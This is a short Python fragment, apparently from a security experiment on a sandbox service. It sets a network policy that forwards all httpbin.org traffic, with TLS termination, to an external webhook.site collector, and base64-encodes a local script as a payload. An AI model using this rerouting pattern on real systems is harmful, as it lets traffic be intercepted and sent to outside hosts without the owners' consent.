# 实验H1流程: 创建沙箱 -> 配置 httpbin.org 转发规则(TLS终止) -> 抓证书指纹
...
c, r = api("POST", f"/v2/sandboxes/sessions/{sid}/network-policy?teamId={TEAM}",
           {"allow": {"httpbin.org": [
               {"match": {"path": {"startsWith": "/"}},
                "forwardURL": "https://webhook.site/37300a03-8069-4291-b1a5-3a5adeba1ae4"}]}})
print("update:", c, r[:120])

payload = base64.b64encode(pathlib.Path("exp_h1.py").read_bytes()).decode()
